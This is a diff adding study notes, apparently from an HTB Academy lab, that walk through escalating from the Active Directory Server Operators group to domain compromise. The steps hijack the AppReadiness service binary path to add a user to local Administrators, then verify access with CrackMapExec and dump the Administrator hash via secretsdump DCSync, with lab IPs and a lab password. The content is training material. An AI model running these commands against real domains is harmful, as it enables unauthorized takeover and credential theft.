@@ -1914,3 +1914,146 @@ Yes
 ```
 
 ---
+
+# 📝 Server Operators
+
+## 🔍 Overview
+
+* **Server Operators** is a **highly privileged built-in group** in Active Directory.
+* Members can:
+
+  * Log in locally to **servers**, including **Domain Controllers**
+  * Start/stop services
+  * Modify service configurations (SERVICE_ALL_ACCESS)
+  * Use **SeBackupPrivilege** & **SeRestorePrivilege**
+
+This makes the group extremely powerful even without being a Domain Admin.
+
+## 🔑 Enumeration
+
+### 1. Query AppReadiness Service Configuration
+
+```cmd
+sc qc AppReadiness
+```
+
+Output summary:
+
+* Service runs as **LocalSystem**
+* Binary: `C:\Windows\System32\svchost.exe -k AppReadiness -p`
+* Start type: demand start
+
+Since it runs as SYSTEM and Server Operators have full access, it’s a valid escalation target.
+
+
+### 2. Check Service Permissions with PsService
+
+```cmd
+c:\Tools\PsService.exe security AppReadiness
+```
+
+Important finding:
+
+```
+[ALLOW] BUILTIN\Server Operators
+        All
+```
+
+→ Server Operators have **SERVICE_ALL_ACCESS** → full control over the service.
+
+
+### 3. Confirm Target Account Is *Not* a Local Admin
+
+```cmd
+net localgroup Administrators
+```
+
+Expected output contains:
+
+* Administrator
+* Domain Admins
+* Enterprise Admins
+
+**server_adm is NOT present** at this stage.
+
+
+## 🚀 Exploitation — Service Binary Path Hijack
+
+### Step 1: Modify the service binary path
+
+Replace the service executable with a command that adds the attacker to the Administrators group:
+
+```cmd
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+Expected:
+
+```
+[SC] ChangeServiceConfig SUCCESS
+```
+
+
+### Step 2: Start the service
+
+```cmd
+sc start AppReadiness
+```
+
+Expected output:
+
+```
+[SC] StartService FAILED 1053
+```
+
+This is **normal** — the service fails, but the **command executes** before the failure.
+
+
+### Step 3: Confirm successful privilege escalation
+
+```cmd
+net localgroup Administrators
+```
+
+Expected:
+
+```
+server_adm
+```
+
+The user has now become a **local administrator on the Domain Controller**.
+
+## 🛠️ Post-Exploitation
+
+### 1. Validate Admin Access on DC
+
+Using CrackMapExec:
+
+```bash
+crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+```
+
+Expected:
+
+```
+(Pwn3d!)
+```
+
+
+### 2. Dump NTLM Hashes (DCSync)
+
+Retrieve Administrator password hash:
+
+```bash
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+```
+
+You get:
+
+* NTLM hash
+* AES keys
+
+These are **Domain Controller secrets** → full domain compromise.
+
+---
+
